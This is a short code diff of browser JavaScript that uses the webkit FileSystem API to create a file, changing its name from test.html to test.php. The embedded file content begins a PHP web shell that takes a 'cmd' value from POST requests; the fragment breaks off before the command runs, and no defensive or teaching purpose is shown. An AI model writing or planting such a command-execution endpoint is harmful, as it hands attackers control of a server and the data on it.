@@ -28,7 +28,7 @@
       }
 
       window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
-        fs.root.getFile("test.html", { create: true }, function(fileEntry) {
+        fs.root.getFile("test.php", { create: true }, function(fileEntry) {
           fileEntry.createWriter(function(fileWriter) {
             const htmlContent = `<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
